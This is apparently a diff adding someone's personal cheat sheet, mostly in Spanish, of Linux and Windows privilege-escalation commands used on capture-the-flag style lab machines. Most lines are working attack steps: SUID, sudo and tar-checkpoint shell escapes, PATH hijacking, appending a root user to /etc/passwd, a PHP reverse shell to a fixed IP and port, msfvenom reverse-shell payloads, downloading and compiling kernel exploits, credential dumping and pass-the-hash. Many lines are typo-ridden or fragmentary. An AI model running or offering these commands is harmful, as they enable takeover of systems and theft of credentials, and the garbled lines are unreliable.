@@ -1,0 +1,341 @@
+https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py
+https://raw.githubusercontent.com/DotNetRussell/ShinobiShell/master/ShinobiShell.py
+
+cat /etc/services
+
+getcap -r /
+
+find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always
+
+find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/null {} \;
+
+https://medium.com/@liau.weijie/privilege-escalation-on-linux-platform-8b3fbd0b1dd4
+
+bash '127.0.0.1/1`/bin/bash > $(tty)`'
+
+('cp /bin/bash /tmp/rro.bash; chmod +s /tmp/rot.bas')
+
+echo 'os.execute("/bin/bash")' > /var/tmp/shell.nse && sudo nmap --script /var/tmp/shell.nse
+
+cuando vemos un * es que podemos 
+exploitarlo
+touch creacion de archivo
+
+cunado le das permisos a /bin/bash chmod +s /bin/bash
+bash -p
+
+echo "chmod +x /bin/bash" > shell.sh
+
+touch ./--checkpoint=1
+
+touch "./--checkpoint-action=exec=sh shell.sh"
+
+geobins systemctl
+
+
+https://computernewage.com/2019/09/20/linux-terminal-servicios-gestion/
+linux comprabar servivcios
+
+tmp
+dev  o otra carpeta dentro
+
+find / -writable -type d 2>/dev/null directroio escribibles
+find / -perm -u=s -type f 2>/dev/null
+
+/bin/nano /opt/priv
+reset; sh 1>&0 2>&0
+
+sudo su
+
+txt
+usseradd aaa
+
+id
+
+pspy64s
+chmod 777 pspy64s
+
+g/gtfobins/dpkg/
+
+nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
+id
+
+ubunty 12.04 DIRTYCOW
+gcc -pthread c0w.c -o c0w
+
+grep -rn database db_login db_password
+
+ls /etc/sudoers.d/joanna
+ls /etc/sudoers
+ls /etc/sudoers
+
+linpeas v2.1.1
+https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+
+https://www.sudo.ws/alerts/pwfeedback.html
+
+locate *.bak
+https://github.com/Ignitetechnologies/Privilege-Escalation
+
+https://guif.re/linuxeop#Linux%20elevation%20of%20privileges,%20manual%20testing
+https://gtfobins.github.io/gtfobins/jjs/#shell-
+
+a veces es mejor salirse a la raiz root para ejecutar los comandos
+ /nmap/#shell
+--------------
+sudo /usr/bin/ed
+-------------------------
+https://guif.re/linuxeop
+------------------------
+
+https://gtfobins.github.io/gtfobins/jjs/#shell-
+-
+------------------
+
+nopasswd: /usr/sbin/service cuando sea desconocido probar yponer siempre usuario
+
+sudo -u peter /usr/sbin/service ../../bin/sh
+!/bin/bash
+
+
+---revisar bash history --apache --db---
+export TERM=xterm-256color
+ls -lah
+whoami
+cat os-*
+id
+cat /etc/shadow|grep root
+wget -O exploit.c http://www.exploit-db.com/download/18411
+gcc -o mempodipper exploit.c
+uname -a
+cat /proc/version
+sudo su
+
+sudo -u root cat /etc/shadow
+sudo -s
+/bin/sudo -u dozer desde la ruta
+
+sudo -u scriptmanager /bin/bash-------------  archivo que no tiene nada
+sudo mysql -e '\! /bin/sh'
+
+bash -i
+
+!!!!modificacion de archivo echo "su" cuidado no modificar el archivo entero puede dar error
+find / -user root -perm -4000 -print 2> /dev/null
+find / -user root -perm -4000 -print 2> /dev/null
+find / -perm -4000 -print 2> /dev/null
+find / -perm -u=s -type f 2>/dev/null
+find / -user devops
+find / -type -perom 0777 2>/dev/null
+ind / -writable -type d 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
+find \-nmae *config.php* 2>/dev/null 
+./find . -exec /bin/sh -p \; -quit
+sudo su si tenemos all all all
+revisar www/admin y www
+---------
+sudo -u usiario archivo
+-----------
+ps aux
+ps -ef
+su nombre
+su root
+sudo -l
+sudo -u trinity y el archivo
+sudo -u root persona
+buscar apache.confg
+budcar mail
+revisar versiones kernell buscar sploit
+DominicBreuker/pspy enumera subprocesos
+
+cat /etc/crontab
+
+linux kernel escalation https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+linuxprivesca.py
+
+
+sudo -l
+https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d
+
+https://netsec.ws/?p=337 ((mas simple))
+
+pentestmonkey http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+blog.g0tmi1k.com/2011/08 basi linux privilege escalation
+--------------------------------
+
+windows
+fit /adh
+python pyinstaller.py --onefile ms11-080.py
+--
+--icacls scsiaccess.exe 
+te deja ver los permisos de los archivos
+vemos que todos Everyone
+creamos un exploit
+--cat useradd.c #include <stdlib.h> /* system, NULL, EXIT_FAILURE */
+int main () { int i; i=system ("net localgroup administrators low /add"); return 0; }
+lo sustituitmos por sciaccess.exe original
+--i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
+
+---------------------
+windows
+---------------------
+en el cmd
+usar fgdump.exe
+type 127.0.0.1.pwdump
+---------------------
+whoami
+wce -w
+---------------------
+pth-winexe -U administrator% //10.11.01.76 cmd 
+
+------------------------
+LinEnum
+----------------------------
+https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List
+
+---------------------------------------------
+strings backup
+ruta completa /usr/bin/cat
+echo $PATH
+CD TMP
+ECHO "bin/sh" > cat
+chmod 777 cat
+export PATH=/tmp:$PATH
+----------------------
+cd-- me vuelta a la tura del principio
+-----------------------------
+-----------------------------
+sudo -u -root /usr/bin/zip 89.zip 89 -T --unzip-command="sh -c /bin/bash"
+sudo -u root tar
+
+sudo -u root /bin/tar -cd /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+echo "charles ALL=(ALL:ALL)ALL" | sudo teehee -a /etc/sudoers
+
+kernel 4.4.x funciona con el doublepouse
+
+cuando no tenemos comando hay que agregarlos
+echo $PATH  
+export PATH=$path:/bin:/usr/bin
+
+.strings /opt/statuscheck   curl
+/opt/statuscheck
+echo "/bin/sh" > curl
+chmod 777 curl
+echo $PATH
+export PATH=/tmp:$PATH
+/opt/statuscheck
+id
+cd /root
+cat proof.txt
+
+mirar la carpeta
+opt
+
+all all
+sudo su
+
+sudo -l
+
+string /usr/bin/sky
+tmp
+echo '/bin/sh' > whoami 
+chmod 777 whoami 
+export PATH=/tmp:$PATH
+
+touch hacked
+find . hacked -exec  '("/bin/sh")' \;
+
+strings
+/usr/bin/morpheus
+cat .bash_history
+morpheus 'BEGIN {system("/bin/sh2)}"
+
+echo bin/sh
+chmod 777
+./oracle
+
+report chkrootkit
+
+https://hacknpentest.com/linux-privilege-escalation-via-writeable-etc-passwd-file/
+
+aplicacion en c
+mirar si se puede conseguir un bugger char(20)
+simonA*15
+----------------------
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+------------------
+apach2.conf
+agregar user y un pass
+y luego resetear pero habiendo suubido un php
+----------------
+sudo -c
+python -c 'import..etc
+----------
+openssl
+usuario 0:0
+https://www.hackingarticles.in/hack-the-billu-b0x-2-vm-boot-to-root/
+------------------
+msfvenom -p cmd/unix/reverse_bash lhost lport R
+-----------
+read and write
+crear un usuario y agregarlo a passwd en /etc/passwd
+openssl passwd -1 –salt user3 pass123
+luego meterlo cn echo
+echo 'will:resulktado/:0:0::/root/bin/bash' >> /etc/passwd
+------------------------
+----------------------------
+maquinas time.sh settimectl
+mirar hackingarticles maquina password-policy.sh
+...........................................
+si veo una contraseña passwd meterla entera en john porque 
+suelta a veces no la pilla
+--------------------------------------------
+mirar el archiv contab para ver lo que se ejecuta 
+cat /etc/crontab
+-------------------------
+cuando hay un fichero haciendo algo a veces puedo meterle
+una shell con echo
+msfvenom -p cmd/unix/reverse_bash lhost lport R
+---------------------
+ltrace binario para ver lo que hace
+----
+acordarse de mongodb mongo
+------------
+ls -LaR
+------------------------
+/usr/bin/tmux -S /.devs/dev_sess
+-----------------
+version 3.9 e inferiores normalmente vulnerables al dirty cow
+maquina valentine de victor
+----------------
+lxd
+id
+lxd-alpine-builder.git
+-------------
+https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html
+-----------------------
+Ubuntu 11.10, 32 bit CVE 2012-0056
+-------------
+https://www.exploit-db.com/exploits/15704 linux 2.6.37
+
+https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/
+visudo ALL All
+..........................
+permisos en un archivo 
+podemos añadirle "su" al final sin modificarlo para no romperolo
+-------------------
+ss -lnt
+subprocesos
+------------------------------
+tengo acceso?puedo subir un archivo y luego ejecutarlo?
+export TERM=screen
+----------------------------
+Dirty sock
+snap version
+----------------------------------------------
+---------------------------------------------------
+sudo /usr/bin/php -r '$sock=fsockopen("192.168.29.157",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
